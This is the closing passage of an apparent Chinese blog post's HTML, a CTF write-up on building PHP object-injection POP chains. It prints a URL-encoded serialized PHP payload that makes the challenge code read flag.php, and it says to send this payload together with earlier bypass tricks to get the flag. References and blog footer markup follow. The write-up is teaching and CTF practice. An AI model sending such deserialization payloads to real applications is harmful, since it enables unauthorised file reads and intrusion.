+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22oops%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00oop%22%3BO%3A1%3A%22b%22%3A2%3A%7Bs%3A7%3A%22%00b%00file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A8%3A%22%00b%00token%22%3Bs%3A1%3A%22a%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
+<h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>最后结合前面a、b参数的Bypass exp，直接构造报文发包即可get flag：</p>
+<p><img src="/2019/05/04/PHP对象注入之pop链构造/2.png" alt=""></p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">php对象注入-pop链的构造</a></p>
+<p><a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="noopener">php反序列化pop链一则</a></p>
+
+  </div>
+</article>
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<br><br>
+<div id="vcomments"></div>
+    <script>
+        new Valine({
+            av: AV,
+            el: '#vcomments',
+            appId: 'Jyl0XQwm2jIH31Tx16dygCNv-gzGzoHsz',
+            appKey: 'Iqq1VTg9X5EfKJt3MMIj8MMB',
+            placeholder: '大佬亲临寒站，可否指点一二',
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-pop链"><span class="toc-number">1.</span> <span class="toc-text">0x01 pop链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-练习"><span class="toc-number">2.</span> <span class="toc-text">0x02 练习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-一道CTF题目"><span class="toc-number">3.</span> <span class="toc-text">0x03 一道CTF题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#弱类型Bypass"><span class="toc-number">3.1.</span> <span class="toc-text">弱类型Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pop链构造"><span class="toc-number">3.2.</span> <span class="toc-text">pop链构造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getflag"><span class="toc-number">3.3.</span> <span class="toc-text">getflag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&text=PHP对象注入之pop链构造"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&title=PHP对象注入之pop链构造"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&is_video=false&description=PHP对象注入之pop链构造"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PHP对象注入之pop链构造&body=Check out this article: https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&title=PHP对象注入之pop链构造"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&title=PHP对象注入之pop链构造"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&title=PHP对象注入之pop链构造"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&title=PHP对象注入之pop链构造"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/05/04/PHP对象注入之pop链构造/&name=PHP对象注入之pop链构造&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="false"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Mi1k7ea
+  </div>
+  <span id="busuanzi_container_site_pv"> 
+    <i class="fas fa-eye"></i>
+    过客：<span id="busuanzi_value_site_uv"></span>
+  </span>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
